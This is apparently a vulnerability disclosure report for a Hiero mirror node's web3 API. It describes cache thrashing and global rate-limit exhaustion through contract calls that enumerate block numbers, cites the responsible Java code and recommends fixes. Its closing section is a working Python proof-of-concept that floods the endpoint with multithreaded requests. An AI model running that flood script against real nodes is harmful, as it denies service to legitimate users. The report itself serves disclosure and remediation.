### Title
Cache-Thrashing DoS via Unbounded Historical Block Number Enumeration Exhausts Global Rate Limit and Forces Continuous DB Lookups

### Summary
The `recordFileIndex` Caffeine cache is hardcoded to `maximumSize=10000` with `expireAfterWrite=10m` and is keyed by block index. An unauthenticated attacker can cycle through more than 10,000 distinct historical block numbers to continuously evict cache entries, ensuring every request causes a database lookup via `findByIndex`. Because the application's only throttle is a single global bucket (500 req/s, no per-IP partitioning), a single attacker can consume the entire request budget, denying service to all legitimate users while simultaneously maximizing database load.

### Finding Description

**Cache configuration** — `EvmConfiguration.java` lines 153–164:
```java
final var caffeine = Caffeine.newBuilder()
        .expireAfterWrite(10, TimeUnit.MINUTES)
        .maximumSize(10000)          // hard ceiling, not configurable
        .recordStats();
```
The cache is not backed by `CacheProperties` (unlike every other cache in the same class), so operators cannot tune it without a code change.

**Cache consumer** — `RecordFileRepository.java` lines 27–29:
```java
@Cacheable(cacheNames = CACHE_NAME, cacheManager = CACHE_MANAGER_RECORD_FILE_INDEX,
           unless = "#result == null")
@Query("select r from RecordFile r where r.index = ?1")
Optional<RecordFile> findByIndex(long index);
```
The `unless` guard checks `#result == null`. The return type is `Optional<RecordFile>`. When a block does not exist the repository returns `Optional.empty()`, which is **not null**, so the empty result is cached. This means both existing and non-existent block numbers fill the same 10,000-slot cache.

**Exploit flow:**
1. Attacker sends `eth_call` with `block=0`, `block=1`, …, `block=9999` → fills all 10,000 cache slots.
2. Attacker sends `block=10000`, …, `block=19999` → Caffeine evicts the first 10,000 entries (LRU/size-based); each of the 10,000 new requests misses the cache and executes `SELECT … WHERE index = ?`.
3. Attacker cycles back to `block=0`–`9999` → evicts the second batch, another 10,000 DB queries.
4. Repeat indefinitely.

**Global throttle** — `ThrottleManagerImpl.java` lines 37–42 / `ThrottleProperties.java` line 35:
```java
if (!rateLimitBucket.tryConsume(1)) {          // single shared bucket
    throw new ThrottleException(...);
}
// default: requestsPerSecond = 500
```
The `rateLimitBucket` is a single JVM-wide token bucket. There is no per-IP, per-session, or per-user partitioning anywhere in the throttle stack (`ThrottleManagerImpl`, `ThrottleProperties`, `RequestFilter`). One attacker consuming 500 req/s starves all other callers.

### Impact Explanation
A single unauthenticated attacker can:
- Consume the entire 500 req/s global budget, returning HTTP 429 to every legitimate caller.
- Force up to 500 `SELECT … WHERE index = ?` queries per second against the database with zero cache benefit, amplifying DB load compared to normal operation where repeated block lookups are served from cache.
- Sustain the attack indefinitely at low cost (minimal gas, minimal payload, no credentials).

### Likelihood Explanation
The attack requires no privileges, no tokens, and no special knowledge beyond the public API contract. The `block` field of `ContractCallRequest` accepts arbitrary numeric values. Cycling through 20,000 integers in a loop is trivial. The attacker does not need to exceed the rate limit — staying just under 500 req/s is sufficient to monopolize the service. The attack is fully repeatable and stateless.

### Recommendation
1. **Per-IP rate limiting**: Partition the token bucket by client IP (e.g., via a `ConcurrentHashMap<String, Bucket>` keyed on `X-Forwarded-For` / `RemoteAddr`) so one source cannot exhaust the global budget.
2. **Negative-result caching guard**: Change the `unless` condition on `findByIndex` to also exclude empty Optionals:
   ```java
   unless = "#result == null || !#result.isPresent()"
   ```
   This prevents non-existent block numbers from occupying cache slots and reduces the attacker's ability to fill the cache with garbage entries.
3. **Make cache size configurable**: Move `recordFileIndex` cache parameters into `CacheProperties` (like every other cache in `EvmConfiguration`) so operators can tune `maximumSize` and `expireAfterWrite` without a code change.
4. **Block-number range validation**: Reject `block` values that exceed the current chain tip before the cache/DB lookup path is reached.

### Proof of Concept
```python
import requests, itertools, threading

URL = "https://<mirror-node>/api/v1/contracts/call"
PAYLOAD_TEMPLATE = {
    "to": "0x0000000000000000000000000000000000000167",
    "data": "0x",
    "gas": 21000
}

def flood(start, end):
    for block_num in itertools.cycle(range(start, end)):
        payload = {**PAYLOAD_TEMPLATE, "block": str(block_num)}
        requests.post(URL, json=payload)   # fire-and-forget

# Phase 1: fill cache slots 0-9999
t1 = threading.Thread(target=flood, args=(0, 10000))
# Phase 2: evict with slots 10000-19999, forcing DB hits
t2 = threading.Thread(target=flood, args=(10000, 20000))

t1.start(); t2.start()
# Result: cache thrashes continuously; all 500 req/s consumed;
# legitimate callers receive HTTP 429; DB receives ~500 index lookups/sec.
``` [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3)

### Citations

**File:** web3/src/main/java/org/hiero/mirror/web3/evm/config/EvmConfiguration.java (L153-164)
```java
    @Bean(CACHE_MANAGER_RECORD_FILE_INDEX)
    @Primary
    CacheManager cacheManagerRecordFileIndex() {
        final var caffeine = Caffeine.newBuilder()
                .expireAfterWrite(10, TimeUnit.MINUTES)
                .maximumSize(10000)
                .recordStats();
        final CaffeineCacheManager caffeineCacheManager = new CaffeineCacheManager();
        caffeineCacheManager.setCacheNames(Set.of(CACHE_NAME));
        caffeineCacheManager.setCaffeine(caffeine);
        return caffeineCacheManager;
    }
```

**File:** web3/src/main/java/org/hiero/mirror/web3/repository/RecordFileRepository.java (L27-29)
```java
    @Cacheable(cacheNames = CACHE_NAME, cacheManager = CACHE_MANAGER_RECORD_FILE_INDEX, unless = "#result == null")
    @Query("select r from RecordFile r where r.index = ?1")
    Optional<RecordFile> findByIndex(long index);
```

**File:** web3/src/main/java/org/hiero/mirror/web3/throttle/ThrottleManagerImpl.java (L37-42)
```java
    public void throttle(ContractCallRequest request) {
        if (!rateLimitBucket.tryConsume(1)) {
            throw new ThrottleException(REQUEST_PER_SECOND_LIMIT_EXCEEDED);
        } else if (!gasLimitBucket.tryConsume(throttleProperties.scaleGas(request.getGas()))) {
            throw new ThrottleException(GAS_PER_SECOND_LIMIT_EXCEEDED);
        }
```

**File:** web3/src/main/java/org/hiero/mirror/web3/throttle/ThrottleProperties.java (L35-35)
```java
    private long requestsPerSecond = 500;
```
